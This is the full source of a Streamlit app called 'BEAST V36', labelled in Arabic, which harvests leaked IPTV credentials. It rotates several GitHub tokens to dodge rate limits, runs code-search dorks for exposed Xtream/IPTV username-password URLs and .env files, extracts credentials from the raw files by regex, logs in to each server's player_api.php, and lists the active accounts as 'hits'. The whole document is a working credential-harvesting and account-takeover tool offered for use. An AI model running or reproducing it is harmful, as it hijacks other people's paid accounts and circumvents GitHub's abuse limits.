import streamlit as st
import requests
import re
import time
from datetime import datetime

# إعدادات الواجهة
st.set_page_config(page_title="BEAST V36 - MULTI-TOKEN", layout="wide")

# نظام الدخول
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V36 - MULTI-TOKEN FEED</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تنسيق الألوان الاحترافي
st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 12px; margin: 0; padding: 2px; border-bottom: 1px solid #111; }
    .active-hit { 
        background: #0d1117; border: 1px solid #00ff41; 
        padding: 15px; border-radius: 8px; margin-bottom: 10px;
        box-shadow: 0 0 10px rgba(0,255,65,0.1);
    }
    .text-green { color: #00ff41; font-weight: bold; font-size: 16px; }
    .text-yellow { color: #fbbf24; font-weight: bold; }
    .text-white { color: #fff; font-family: monospace; }
    .cat-list { color: #888; font-size: 11px; margin-top: 5px; font-style: italic; }
</style>
""", unsafe_allow_html=True)

# الجانب الجانبي للتحكم
with st.sidebar:
    st.title("⚡ BEAST V36")
    tokens_raw = st.text_area("أدخل التوكنات (كل توكن في سطر):", height=150, placeholder="ghp_xxx\nghp_yyy")
    tokens = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
    
    st.divider()
    search_depth = st.slider("عمق البحث (عدد الصفحات):", 1, 50, 20)
    start = st.button("🚀 إطلاق الهجوم الشامل")
    
    if tokens:
        st.success(f"تم تفعيل {len(tokens)} توكنات")

# مناطق العرض
st.subheader("📡 الرادار المباشر (فحص التوكنات والروابط)")
radar_area = st.empty() 

st.subheader("🏆 النتائج المكتشفة (Hits)")
hits_area = st.container()

# المحرك الرئيسي
if start and tokens:
    found_count = 0
    token_index = 0
    
    # أقوى دروكات لجلب نتائج عربية وعالمية ضخمة
    dorks = [
        'extension:txt "get.php?username=" "password="', 
        'extension:m3u "player_api.php"',
        'extension:php "panel_api.php" username password',
        '"http://" "username=" "password=" "port" extension:txt',
        'extension:json "server_url" "username"',
        'extension:m3u8 "username=" "password="',
        'filename:.env "XTREAM_PASSWORD"',
        'path:etc/php "get.php?username="'
    ]
    
    for dork in dorks:
        for page in range(1, search_depth + 1):
            # تبديل التوكن تلقائياً لتجنب الحظر
            current_token = tokens[token_index % len(tokens)]
            headers = {
                'Authorization': f'token {current_token}', 
                'Accept': 'application/vnd.github.v3+json'
            }
            
            try:
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100&sort=indexed"
                res = requests.get(search_url, headers=headers).json()
                
                # إذا تم حظر التوكن الحالي، انتقل للتالي
                if "items" not in res:
                    radar_area.warning(f"Token {token_index + 1} Limited! Switching...")
                    token_index += 1
                    time.sleep(1)
                    continue

                for item in res['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        content = requests.get(raw_url, timeout=3).text
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        
                        for m in matches:
                            host, user, pw = m[0], m[1], m[2]
                            radar_area.markdown(f"<p class='scan-log'>🔍 Checking: {host}</p>", unsafe_allow_html=True)
                            
                            try:
                                # الفحص وجلب البيانات
                                api_url = f"{host}/player_api.php?username={user}&password={pw}"
                                r = requests.get(api_url, timeout=2).json()
                                
                                if r.get("user_info", {}).get("status") == "Active":
                                    # جلب عينة من الباقات والقنوات
                                    cat_res = requests.get(f"{api_url}&action=get_live_categories", timeout=2).json()
                                    cat_names = [c['category_name'] for c in cat_res[:8]] if isinstance(cat_res, list) else ["No Categories"]
                                    
                                    found_count += 1
                                    with hits_area:
                                        st.markdown(f"""
                                        <div class="active-hit">
                                            <span class="text-green">✅ HIT #{found_count} - {host}</span><br>
                                            <span class="text-white">LOGIN: {user} | PASS: {pw}</span><br>
                                            <div class="cat-list">📦 الباقات: {" | ".join(cat_names)}</div>
                                        </div>
                                        """, unsafe_allow_html=True)
                            except: continue
                    except: continue
            except Exception as e:
                token_index += 1
                continue
